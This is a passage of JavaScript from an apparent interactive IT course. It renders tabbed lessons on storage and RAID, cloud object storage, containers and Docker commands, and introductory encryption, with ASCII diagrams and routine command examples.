            interfaces: 'STORAGE INTERFACES:\n\n┌──────────────┬────────────┬──────────────┐\n│ Interface    │ Speed      │ Use Case     │\n├──────────────┼────────────┼──────────────┤\n│ SATA III     │ 6 Gbps     │ Consumer SSD │\n│ SAS          │ 12 Gbps    │ Enterprise   │\n│ NVMe (PCIe4) │ 64 Gbps    │ Performance  │\n│ USB 3.2      │ 20 Gbps    │ External     │\n│ Thunderbolt4 │ 40 Gbps    │ Mac/Pro      │\n└──────────────┴────────────┴──────────────┘\n\nSTORAGE AREA NETWORK (SAN):\n  ┌─────────┐\n  │ Server  │──┐\n  └─────────┘  │    ┌────────────────┐\n  ┌─────────┐  ├───▶│  SAN Switch    │\n  │ Server  │──┤    │  (Fibre/iSCSI) │\n  └─────────┘  │    └───────┬────────┘\n  ┌─────────┐  │            │\n  │ Server  │──┘     ┌──────▼──────┐\n  └─────────┘        │ Storage Array│\n                     └─────────────┘',
            forensics: 'FORENSIC IMPLICATIONS:\n\nHDD FORENSICS:\n  ✅ Deleted files often recoverable\n  ✅ File carving from unallocated space\n  ✅ Magnetic remnants persist\n  ⚠️ Bad sectors may hide data\n\nSSD FORENSICS:\n  ⚠️ TRIM command zeros deleted blocks\n  ⚠️ Wear leveling moves data\n  ⚠️ Encryption chips (OPAL)\n  ❌ Hardware encryption = no recovery\n\n┌─────────────────────────────────────┐\n│ SECURE DELETION METHODS             │\n├─────────────────────────────────────┤\n│ HDD: Multiple overwrite passes      │\n│      DoD 5220.22-M (3 passes)       │\n│      Gutmann method (35 passes)     │\n├─────────────────────────────────────┤\n│ SSD: ATA Secure Erase command       │\n│      Encryption + key destruction   │\n│      Physical destruction           │\n└─────────────────────────────────────┘'
        };
        $('#storageOut').textContent = data.types;
        $$('#storageTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#storageTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#storageOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C8 Lesson 11: raid-explained - RAID Configurations Explained
    function demoRAIDExplained(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">RAID Configurations Explained</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="raidExpTabs">
                <button class="demo-btn demo-btn-sm active" data-t="r0">RAID 0/1</button>
                <button class="demo-btn demo-btn-sm" data-t="r5">RAID 5/6</button>
                <button class="demo-btn demo-btn-sm" data-t="r10">RAID 10</button>
                <button class="demo-btn demo-btn-sm" data-t="choose">Choosing</button>
            </div>
            <div id="raidExpOut" style="background:#1e1e1e;color:#4fc3f7;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            r0: 'RAID 0 (Striping) vs RAID 1 (Mirroring):\n\nRAID 0:             RAID 1:\n┌────┐ ┌────┐      ┌────┐ ┌────┐\n│ A  │ │ B  │      │ AB │ │ AB │\n│ C  │ │ D  │      │ CD │ │ CD │\n└────┘ └────┘      └────┘ └────┘\n Data split         Exact copy\n\n┌──────────────┬─────────┬─────────┐\n│ Property     │ RAID 0  │ RAID 1  │\n├──────────────┼─────────┼─────────┤\n│ Min Disks    │ 2       │ 2       │\n│ Capacity     │ 100%    │ 50%     │\n│ Read Speed   │ 2x      │ 2x      │\n│ Write Speed  │ 2x      │ 1x      │\n│ Redundancy   │ NONE    │ Full    │\n│ Failure Risk │ HIGH    │ LOW     │\n└──────────────┴─────────┴─────────┘',
            r5: 'RAID 5 & RAID 6 (Parity-based):\n\nRAID 5: Distributed Parity\n┌────┐ ┌────┐ ┌────┐\n│ A1 │ │ A2 │ │ Ap │ ← Parity rotates\n│ B1 │ │ Bp │ │ B2 │\n│ Cp │ │ C1 │ │ C2 │\n└────┘ └────┘ └────┘\n\nRAID 6: Double Parity\n┌────┐ ┌────┐ ┌────┐ ┌────┐\n│ A1 │ │ A2 │ │ Ap │ │ Aq │\n│ B1 │ │ Bp │ │ Bq │ │ B2 │\n└────┘ └────┘ └────┘ └────┘\n\n┌──────────────┬─────────┬─────────┐\n│ Property     │ RAID 5  │ RAID 6  │\n├──────────────┼─────────┼─────────┤\n│ Min Disks    │ 3       │ 4       │\n│ Capacity     │ (n-1)/n │ (n-2)/n │\n│ Fault Tol.   │ 1 disk  │ 2 disks │\n│ Write Perf   │ Slower  │ Slowest │\n└──────────────┴─────────┴─────────┘',
            r10: 'RAID 10 (1+0): Best of Both Worlds:\n\n        ┌─────────STRIPE─────────┐\n        │                        │\n   ┌────▼────┐           ┌───────▼───┐\n   │ Mirror 1│           │  Mirror 2 │\n   │┌──┐ ┌──┐│           │ ┌──┐ ┌──┐ │\n   ││D1│ │D2││           │ │D3│ │D4│ │\n   ││A │ │A ││           │ │B │ │B │ │\n   │└──┘ └──┘│           │ └──┘ └──┘ │\n   └─────────┘           └───────────┘\n\nAdvantages:\n  ✅ Full mirror redundancy\n  ✅ Stripe performance (2x write)\n  ✅ Can lose 1 disk per mirror\n  ✅ Fast rebuild (only mirror)\n\nDisadvantages:\n  ❌ 50% capacity overhead\n  ❌ Minimum 4 disks\n  ❌ More expensive',
            choose: 'CHOOSING THE RIGHT RAID:\n\n┌─────────────────────────────────────┐\n│ USE CASE → RAID RECOMMENDATION      │\n├─────────────────────────────────────┤\n│ Video editing scratch   → RAID 0    │\n│ Home NAS (data safety)  → RAID 1    │\n│ File server (balanced)  → RAID 5    │\n│ Large arrays (safety)   → RAID 6    │\n│ Database server (perf)  → RAID 10   │\n│ VM hypervisor           → RAID 10   │\n└─────────────────────────────────────┘\n\n⚠️ RAID IS NOT BACKUP!\n\nRAID protects against:\n  ✅ Disk hardware failure\n\nRAID does NOT protect against:\n  ❌ Accidental deletion\n  ❌ Ransomware/malware\n  ❌ Corruption\n  ❌ Controller failure\n  ❌ Fire/theft/disaster\n\n→ Always maintain separate backups!'
        };
        $('#raidExpOut').textContent = data.r0;
        $$('#raidExpTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#raidExpTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#raidExpOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C8 Lesson 12: cloud-storage-mech - Cloud Storage Mechanisms
    function demoCloudStorageMech(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">Cloud Storage Mechanisms</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="cloudTabs">
                <button class="demo-btn demo-btn-sm active" data-t="types">Cloud Types</button>
                <button class="demo-btn demo-btn-sm" data-t="s3">Object Storage</button>
                <button class="demo-btn demo-btn-sm" data-t="security">Security</button>
            </div>
            <div id="cloudOut" style="background:#1e1e1e;color:#ff9800;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            types: 'CLOUD STORAGE TYPES:\n\n┌──────────────┬──────────────────────────┐\n│ Type         │ Description              │\n├──────────────┼──────────────────────────┤\n│ Block        │ Raw storage volumes      │\n│ Storage      │ Like virtual hard drives │\n│ (EBS, Azure  │ Attach to VMs            │\n│  Disk)       │ High performance         │\n├──────────────┼──────────────────────────┤\n│ Object       │ Flat namespace storage   │\n│ Storage      │ Files + metadata         │\n│ (S3, GCS,    │ HTTP API access          │\n│  Azure Blob) │ Massive scale            │\n├──────────────┼──────────────────────────┤\n│ File         │ Traditional file system  │\n│ Storage      │ NFS/SMB protocols        │\n│ (EFS, Azure  │ Shared across instances  │\n│  Files)      │ Familiar interface       │\n└──────────────┴──────────────────────────┘',
            s3: 'OBJECT STORAGE (S3 EXAMPLE):\n\n$ aws s3 ls\n2024-01-15 10:30:00 my-bucket\n2024-01-16 14:20:00 backup-bucket\n\n$ aws s3 cp file.txt s3://my-bucket/\nupload: ./file.txt to s3://my-bucket/file.txt\n\n$ aws s3 ls s3://my-bucket/ --recursive\n2024-01-17 docs/report.pdf\n2024-01-17 images/logo.png\n2024-01-17 file.txt\n\nS3 BUCKET PERMISSIONS:\n┌─────────────────────────────────────┐\n│  ⚠️ COMMON MISCONFIGURATIONS        │\n├─────────────────────────────────────┤\n│  Public bucket ACL (--acl public)   │\n│  Overly permissive bucket policy    │\n│  No encryption at rest              │\n│  Missing access logging             │\n└─────────────────────────────────────┘\n\n🔴 Data breaches from misconfigured S3!',
            security: 'CLOUD STORAGE SECURITY:\n\n┌─────────────────────────────────────┐\n│      ENCRYPTION OPTIONS             │\n├─────────────────────────────────────┤\n│ SSE-S3:  AWS managed keys           │\n│ SSE-KMS: Customer managed keys      │\n│ SSE-C:   Customer provided keys     │\n│ Client:  Encrypt before upload      │\n└─────────────────────────────────────┘\n\nACCESS CONTROLS:\n  • IAM policies (who can access)\n  • Bucket policies (what\'s allowed)\n  • ACLs (legacy permissions)\n  • VPC endpoints (network isolation)\n\nBEST PRACTICES:\n  ✅ Enable versioning (ransomware protection)\n  ✅ Block public access by default\n  ✅ Enable access logging\n  ✅ Use encryption at rest\n  ✅ Implement least privilege\n  ✅ Enable MFA delete for critical data\n  ✅ Use S3 Object Lock for compliance'
        };
        $('#cloudOut').textContent = data.types;
        $$('#cloudTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#cloudTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#cloudOut').textContent = data[b.dataset.t];
            };
        });
    }

    // Backward compatibility for demoRAIDStorage
    function demoRAIDStorage(pane) { demoRAIDExplained(pane); }

    // C8 Lesson 13: container-intro - Introduction to Containers
    function demoContainerIntro(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-success">INTERACTIVE</span><span class="demo-title">Introduction to Containers</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="contIntroTabs">
                <button class="demo-btn demo-btn-sm active" data-t="what">What Are Containers?</button>
                <button class="demo-btn demo-btn-sm" data-t="why">Why Containers?</button>
                <button class="demo-btn demo-btn-sm" data-t="components">Components</button>
            </div>
            <div id="contIntroOut" style="background:#0d1117;color:#58a6ff;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            what: 'WHAT ARE CONTAINERS?\n\n┌─────────────────────────────────────┐\n│        Container = Package          │\n├─────────────────────────────────────┤\n│  Application code                   │\n│  + Runtime (Python, Node, Java)     │\n│  + Libraries & dependencies         │\n│  + Configuration files              │\n│  = One portable unit                │\n└─────────────────────────────────────┘\n\n"It works on my machine" → It works EVERYWHERE\n\nCONTAINER ISOLATION:\n┌────────────────────────────────────┐\n│ Container A │ Container B │ Cont C │\n│  App + Libs │  App + Libs │  App   │\n├─────────────┴─────────────┴────────┤\n│        Container Runtime           │\n├────────────────────────────────────┤\n│           Host OS Kernel           │\n└────────────────────────────────────┘\n\nShared kernel, isolated userspace!',
            why: 'WHY USE CONTAINERS?\n\n✅ CONSISTENCY:\n   Same environment: dev = staging = prod\n   No "works on my machine" issues\n\n✅ ISOLATION:\n   Apps don\'t interfere with each other\n   Security boundaries between services\n\n✅ PORTABILITY:\n   Run anywhere: laptop, server, cloud\n   Package once, deploy anywhere\n\n✅ EFFICIENCY:\n   Lightweight (no full OS per app)\n   Fast startup (seconds vs minutes)\n   Better resource utilization\n\n✅ SCALABILITY:\n   Easy horizontal scaling\n   Kubernetes orchestration\n   Microservices architecture\n\nUSE CASES:\n  • CI/CD pipelines\n  • Microservices\n  • Dev environments\n  • Security labs/sandboxing',
            components: 'CONTAINER ECOSYSTEM COMPONENTS:\n\n┌──────────────────────────────────────┐\n│ IMAGE: Blueprint/template            │\n│   • Read-only layers                 │\n│   • Built from Dockerfile            │\n│   • Stored in registries             │\n├──────────────────────────────────────┤\n│ CONTAINER: Running instance          │\n│   • Created from image               │\n│   • Has writable layer               │\n│   • Isolated process(es)             │\n├──────────────────────────────────────┤\n│ REGISTRY: Image storage              │\n│   • Docker Hub (public)              │\n│   • ECR, GCR, ACR (cloud)            │\n│   • Harbor (self-hosted)             │\n├──────────────────────────────────────┤\n│ RUNTIME: Execution engine            │\n│   • Docker Engine                    │\n│   • containerd                       │\n│   • Podman (rootless)                │\n└──────────────────────────────────────┘'
        };
        $('#contIntroOut').textContent = data.what;
        $$('#contIntroTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#contIntroTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#contIntroOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C8 Lesson 14: containers-vs-vms - Containers vs Virtual Machines
    function demoContainersVsVMs(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-success">INTERACTIVE</span><span class="demo-title">Containers vs Virtual Machines</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="vsVmTabs">
                <button class="demo-btn demo-btn-sm active" data-t="arch">Architecture</button>
                <button class="demo-btn demo-btn-sm" data-t="compare">Comparison</button>
                <button class="demo-btn demo-btn-sm" data-t="when">When to Use</button>
            </div>
            <div id="vsVmOut" style="background:#0d1117;color:#7ee787;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            arch: 'ARCHITECTURE COMPARISON:\n\n      VIRTUAL MACHINES          CONTAINERS\n┌─────────────────────┐  ┌─────────────────────┐\n│ App │ App │   App   │  │ App │ App │   App   │\n├─────┼─────┼─────────┤  ├─────┴─────┴─────────┤\n│ Bins│ Bins│   Bins  │  │    Container Runtime│\n├─────┼─────┼─────────┤  │    (Docker/containerd)\n│Guest│Guest│  Guest  │  └──────────┬──────────┘\n│ OS  │ OS  │   OS    │             │\n├─────┴─────┴─────────┤  ┌──────────▼──────────┐\n│    Hypervisor       │  │     Host OS         │\n│  (VMware/KVM/Hyper-V)│  └──────────┬──────────┘\n├─────────────────────┤  ┌──────────▼──────────┐\n│      Host OS        │  │     Hardware        │\n├─────────────────────┤  └─────────────────────┘\n│     Hardware        │\n└─────────────────────┘\n\nVMs: Full OS per workload\nContainers: Shared kernel, isolated userspace',
            compare: 'CONTAINERS vs VMs COMPARISON:\n\n┌────────────────┬────────────┬────────────┐\n│ Feature        │ Containers │ VMs        │\n├────────────────┼────────────┼────────────┤\n│ Startup Time   │ Seconds    │ Minutes    │\n│ Size           │ MBs        │ GBs        │\n│ Performance    │ Near-native│ Overhead   │\n│ Density        │ 100s/host  │ 10s/host   │\n│ Isolation      │ Process    │ Hardware   │\n│ Security       │ Good       │ Better     │\n│ Portability    │ Excellent  │ Good       │\n│ Guest OS       │ Shared     │ Any OS     │\n└────────────────┴────────────┴────────────┘\n\n⚠️ SECURITY CONSIDERATION:\n  VMs: Hypervisor escape rare, strong boundary\n  Containers: Kernel shared, escape possible\n\n  For untrusted workloads → Prefer VMs\n  For microservices → Containers fine',
            when: 'WHEN TO USE EACH:\n\n✅ USE CONTAINERS WHEN:\n  • Microservices architecture\n  • CI/CD pipelines\n  • Consistent dev environments\n  • High density deployment\n  • Fast scaling needed\n  • Stateless applications\n  • Cloud-native apps\n\n✅ USE VMs WHEN:\n  • Need different OS (Windows on Linux)\n  • Strong isolation required\n  • Legacy applications\n  • Untrusted workloads\n  • Compliance requirements\n  • Running full OS environments\n\n🔄 HYBRID APPROACH:\n  Containers running inside VMs!\n  • Best of both worlds\n  • VM isolation + Container efficiency\n  • Example: Kubernetes on VMware\n  • Example: Firecracker microVMs'
        };
        $('#vsVmOut').textContent = data.arch;
        $$('#vsVmTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#vsVmTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#vsVmOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C8 Lesson 15: docker-intro - Docker Introduction
    function demoDockerIntro(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-success">INTERACTIVE</span><span class="demo-title">Docker Introduction</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="dockerIntroTabs">
                <button class="demo-btn demo-btn-sm active" data-t="install">Installation</button>
                <button class="demo-btn demo-btn-sm" data-t="arch">Architecture</button>
                <button class="demo-btn demo-btn-sm" data-t="first">First Container</button>
            </div>
            <div id="dockerIntroOut" style="background:#0d1117;color:#79c0ff;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            install: 'DOCKER INSTALLATION:\n\n# Ubuntu/Debian:\n$ sudo apt update\n$ sudo apt install docker.io\n$ sudo systemctl enable --now docker\n$ sudo usermod -aG docker $USER\n\n# Verify installation:\n$ docker --version\nDocker version 24.0.5, build 24.0.5-0ubuntu1\n\n$ docker info\nServer:\n  Containers: 5\n  Running: 2\n  Storage Driver: overlay2\n  ...\n\n# Test with hello-world:\n$ docker run hello-world\nHello from Docker!\nThis message shows your installation is working.\n\n# Alternative: Podman (rootless)\n$ sudo apt install podman\n$ podman run hello-world',
            arch: 'DOCKER ARCHITECTURE:\n\n┌─────────────────────────────────────┐\n│          Docker Client              │\n│   (docker build, run, pull, ...)    │\n└───────────────┬─────────────────────┘\n                │ REST API\n┌───────────────▼─────────────────────┐\n│          Docker Daemon              │\n│            (dockerd)                │\n├─────────────────────────────────────┤\n│  Images │ Containers │ Networks     │\n│         │            │ Volumes      │\n└───────────────┬─────────────────────┘\n                │\n┌───────────────▼─────────────────────┐\n│           containerd                │\n│    (container runtime)              │\n└───────────────┬─────────────────────┘\n                │\n┌───────────────▼─────────────────────┐\n│             runc                    │\n│   (OCI container executor)          │\n└─────────────────────────────────────┘',
            first: 'YOUR FIRST CONTAINER:\n\n# Run Ubuntu interactively:\n$ docker run -it ubuntu:22.04 bash\nroot@abc123:/# cat /etc/os-release\nNAME="Ubuntu"\nVERSION="22.04.3 LTS"\n\nroot@abc123:/# apt update && apt install curl\nroot@abc123:/# exit\n\n# Run nginx web server:\n$ docker run -d -p 8080:80 nginx\n$ curl localhost:8080\n<!DOCTYPE html>...\n\n# See running containers:\n$ docker ps\nCONTAINER ID  IMAGE  STATUS   PORTS                 NAMES\na1b2c3d4      nginx  Up 5m    0.0.0.0:8080->80/tcp  vigorous_turing\n\n# Stop and remove:\n$ docker stop a1b2c3d4\n$ docker rm a1b2c3d4'
        };
        $('#dockerIntroOut').textContent = data.install;
        $$('#dockerIntroTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#dockerIntroTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#dockerIntroOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C8 Lesson 16: docker-cli-basics - Docker CLI Basics
    function demoDockerCLIBasics(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-success">INTERACTIVE</span><span class="demo-title">Docker CLI Basics</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="cliTabs">
                <button class="demo-btn demo-btn-sm active" data-t="images">Image Commands</button>
                <button class="demo-btn demo-btn-sm" data-t="containers">Container Ops</button>
                <button class="demo-btn demo-btn-sm" data-t="dockerfile">Dockerfile</button>
            </div>
            <div id="cliOut" style="background:#0d1117;color:#ffa657;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            images: 'IMAGE MANAGEMENT COMMANDS:\n\n# Pull image from registry:\n$ docker pull nginx:latest\n$ docker pull python:3.11-slim\n\n# List local images:\n$ docker images\nREPOSITORY  TAG          SIZE\nnginx       latest       142MB\npython      3.11-slim    130MB\nubuntu      22.04        77MB\n\n# Remove image:\n$ docker rmi nginx:latest\n\n# Build image from Dockerfile:\n$ docker build -t myapp:1.0 .\n$ docker build -t myapp:1.0 -f Dockerfile.prod .\n\n# Tag image:\n$ docker tag myapp:1.0 registry.io/myapp:1.0\n\n# Push to registry:\n$ docker push registry.io/myapp:1.0\n\n# Clean up unused images:\n$ docker image prune -a',
            containers: 'CONTAINER OPERATIONS:\n\n# Run container:\n$ docker run nginx                     # Foreground\n$ docker run -d nginx                  # Detached\n$ docker run -it ubuntu bash           # Interactive\n$ docker run -p 8080:80 nginx          # Port mapping\n$ docker run -v /host:/container nginx # Volume mount\n$ docker run --name web nginx          # Named container\n\n# List containers:\n$ docker ps          # Running only\n$ docker ps -a       # All containers\n\n# Container operations:\n$ docker start <container>\n$ docker stop <container>\n$ docker restart <container>\n$ docker rm <container>\n\n# Execute in running container:\n$ docker exec -it web bash\n\n# View logs:\n$ docker logs web\n$ docker logs -f web    # Follow',
            dockerfile: 'DOCKERFILE EXAMPLE:\n\n# Dockerfile\nFROM python:3.11-slim\n\n# Set working directory\nWORKDIR /app\n\n# Copy requirements first (layer caching)\nCOPY requirements.txt .\nRUN pip install --no-cache-dir -r requirements.txt\n\n# Copy application code\nCOPY . .\n\n# Non-root user for security\nRUN useradd -m appuser\nUSER appuser\n\n# Expose port\nEXPOSE 5000\n\n# Health check\nHEALTHCHECK CMD curl -f http'+'://localhost:5000/\n\n# Start application\nCMD ["python", "app.py"]\n\n# Build:\n$ docker build -t myapp:1.0 .\n$ docker run -d -p 5000:5000 myapp:1.0'
        };
        $('#cliOut').textContent = data.images;
        $$('#cliTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#cliTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#cliOut').textContent = data[b.dataset.t];
            };
        });
    }

    // Backward compatibility for demoDocker
    function demoDocker(pane) { demoDockerIntro(pane); }

    /* ============================================================
       C9: SECURITY CONCEPTS DEMOS - UNIQUE PER LESSON
       ============================================================ */

    // C9 Lesson 1: encryption-intro - Introduction to Encryption
    function demoEncryptionIntro(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">Introduction to Encryption</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="encIntroTabs">
                <button class="demo-btn demo-btn-sm active" data-t="what">What is Encryption?</button>
                <button class="demo-btn demo-btn-sm" data-t="history">History</button>
                <button class="demo-btn demo-btn-sm" data-t="modern">Modern Crypto</button>
            </div>
            <div id="encIntroOut" style="background:#1a1a2e;color:#00ff88;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            what: 'WHAT IS ENCRYPTION?\n\n  Converting readable data (plaintext)\n  into scrambled data (ciphertext)\n\n  Plaintext → [Encryption] → Ciphertext\n  "Hello"   →    🔐       → "Xk#9p"\n\n  Ciphertext → [Decryption] → Plaintext\n  "Xk#9p"    →    🔓        → "Hello"\n\n┌─────────────────────────────────────┐\n│ WHY ENCRYPT?                        │\n├─────────────────────────────────────┤\n│ ✅ Confidentiality - Hide data      │\n│ ✅ Integrity - Detect tampering     │\n│ ✅ Authentication - Verify sender   │\n│ ✅ Non-repudiation - Prove origin   │\n└─────────────────────────────────────┘\n\nUsed everywhere: HTTPS, WhatsApp, banking...',
            history: 'ENCRYPTION THROUGH HISTORY:\n\n📜 ANCIENT (Caesar Cipher ~50 BC):\n   Shift letters: A→D, B→E, C→F\n   "HELLO" → "KHOOR"\n   ❌ Easily broken by frequency analysis\n\n🔠 ENIGMA MACHINE (WWII):\n   Electromechanical rotor cipher\n   Broken by Alan Turing & team\n   Led to modern computing!\n\n💻 DIGITAL ERA:\n   1970s: DES (Data Encryption Standard)\n   1990s: RSA (Public Key)\n   2001: AES (Advanced Encryption Standard)\n\n⚠️ KERCHOFFS\' PRINCIPLE:\n   A cipher should be secure even if\n   everything except the KEY is known.\n\n   Security = Key secrecy, NOT algorithm secrecy',
            modern: 'MODERN CRYPTOGRAPHY:\n\n┌─────────────────────────────────────┐\n│       SYMMETRIC ENCRYPTION          │\n├─────────────────────────────────────┤\n│ One key for encrypt AND decrypt     │\n│ Fast, efficient                     │\n│ Challenge: Key distribution         │\n│ Examples: AES-256, ChaCha20         │\n└─────────────────────────────────────┘\n\n┌─────────────────────────────────────┐\n│      ASYMMETRIC ENCRYPTION          │\n├─────────────────────────────────────┤\n│ Two keys: Public + Private          │\n│ Public encrypts, Private decrypts   │\n│ Slower but solves key distribution  │\n│ Examples: RSA, ECC, Ed25519         │\n└─────────────────────────────────────┘\n\n┌─────────────────────────────────────┐\n│          HASHING                    │\n├─────────────────────────────────────┤\n│ One-way function (cannot reverse)   │\n│ Fixed output size                   │\n│ Examples: SHA-256, bcrypt, Argon2   │\n└─────────────────────────────────────┘'
        };
        $('#encIntroOut').textContent = data.what;
        $$('#encIntroTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#encIntroTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#encIntroOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 2: what-is-encryption - What is Encryption Deep Dive
    function demoWhatIsEncryption(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">What is Encryption?</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="whatEncTabs">
                <button class="demo-btn demo-btn-sm active" data-t="basics">Basic Concept</button>
                <button class="demo-btn demo-btn-sm" data-t="demo">Live Demo</button>
                <button class="demo-btn demo-btn-sm" data-t="security">Security Goals</button>
            </div>
            <div id="whatEncOut" style="background:#1a1a2e;color:#64b5f6;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            basics: 'ENCRYPTION FUNDAMENTALS:\n\n                ┌─────────────┐\n   Plaintext ──▶│   CIPHER    │──▶ Ciphertext\n   "secret"     │  Algorithm  │    "Xk9#p2"\n                │  +  KEY     │\n                └─────────────┘\n\nCOMPONENTS:\n\n  📄 Plaintext: Original readable message\n  🔐 Key: Secret value controlling transformation\n  ⚙️ Algorithm: Mathematical process (AES, RSA)\n  📦 Ciphertext: Scrambled unreadable output\n\nWITHOUT THE KEY:\n  • Algorithm is public knowledge\n  • Ciphertext appears random\n  • Cannot recover plaintext\n  • Even with unlimited computing power\n    (for strong encryption)',
            demo: 'SIMPLE ENCRYPTION DEMO (XOR):\n\nPlaintext:  H    e    l    l    o\nASCII:     72   101  108  108  111\n\nKey:       K    e    y    K    e\nASCII:     75   101  121  75   101\n\n           ──── XOR ────\n\nResult:     3    0    21   39   10\n           ◀── Ciphertext (binary)\n\nDECRYPTION (XOR again with same key):\nCipher:     3    0    21   39   10\nKey:       75   101  121  75   101\n           ──── XOR ────\nPlaintext: 72   101  108  108  111\n            H    e    l    l    o  ✓\n\n⚠️ Real encryption (AES) is much more complex!\nXOR alone is not secure.',
            security: 'CRYPTOGRAPHIC SECURITY GOALS:\n\n┌─────────────────────────────────────┐\n│ C - CONFIDENTIALITY                 │\n│     Only intended recipients can    │\n│     read the message                │\n├─────────────────────────────────────┤\n│ I - INTEGRITY                       │\n│     Detect if message was altered   │\n│     (use MACs / digital signatures) │\n├─────────────────────────────────────┤\n│ A - AVAILABILITY                    │\n│     Data accessible when needed     │\n│     (not directly crypto related)   │\n├─────────────────────────────────────┤\n│ + AUTHENTICATION                    │\n│     Verify sender identity          │\n├─────────────────────────────────────┤\n│ + NON-REPUDIATION                   │\n│     Sender cannot deny sending      │\n│     (digital signatures)            │\n└─────────────────────────────────────┘'
        };
        $('#whatEncOut').textContent = data.basics;
        $$('#whatEncTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#whatEncTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#whatEncOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 3: encryption-vs-encoding - Encryption vs Encoding
    function demoEncryptionVsEncoding(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-warning">IMPORTANT</span><span class="demo-title">Encryption vs Encoding</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="encVsEncTabs">
                <button class="demo-btn demo-btn-sm active" data-t="diff">Key Difference</button>
                <button class="demo-btn demo-btn-sm" data-t="encoding">Encoding Examples</button>
                <button class="demo-btn demo-btn-sm" data-t="mistakes">Common Mistakes</button>
            </div>
            <div id="encVsEncOut" style="background:#1a1a2e;color:#ffb74d;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
